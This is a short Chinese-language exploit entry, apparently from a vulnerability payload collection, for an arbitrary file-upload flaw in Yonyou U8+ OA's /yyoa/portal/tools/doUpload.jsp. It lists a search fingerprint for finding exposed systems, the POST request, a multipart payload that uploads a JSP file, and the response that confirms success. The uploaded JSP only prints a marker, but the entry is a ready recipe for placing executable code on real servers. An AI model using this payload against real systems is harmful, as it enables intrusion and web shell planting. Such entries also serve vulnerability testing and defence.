# 用友U8+OAdoUpload.jsp文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`"用友U8-OA"`
- **请求**：`POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1`

**Payload**
```
------syowx9dzsw75xlftuop1
Content-Disposition: form-data; name="iconFile";filename="dudesite.jsp"
<% out.println("dudesite"); %>
------syowx9dzsw75xlftuop1--
```
- **响应特征**：200 jsp